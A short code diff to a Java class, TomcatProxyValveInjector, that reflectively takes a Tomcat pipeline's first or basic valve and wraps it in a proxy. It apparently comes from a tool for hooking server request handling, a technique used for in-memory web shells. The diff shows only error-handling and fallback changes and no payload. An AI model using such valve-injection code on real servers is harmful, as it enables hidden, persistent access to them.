@@ -57,8 +57,8 @@ public class TomcatProxyValveInjector implements InvocationHandler {
                 }
             } catch (Throwable e) {
                 e.printStackTrace();
-                return method.invoke(rawValve, args);
             }
+            return method.invoke(rawValve, args);
         }
         return method.invoke(rawValve, args);
     }
@@ -114,7 +114,9 @@ public class TomcatProxyValveInjector implements InvocationHandler {
         String fieldName = "first";
         try {
             rawValve = getFieldValue(pipeline, fieldName);
-        } catch (NoSuchFieldException e) {
+        } catch (NoSuchFieldException ignored) {
+        }
+        if (rawValve == null) {
             fieldName = "basic";
             rawValve = getFieldValue(pipeline, fieldName);
         }
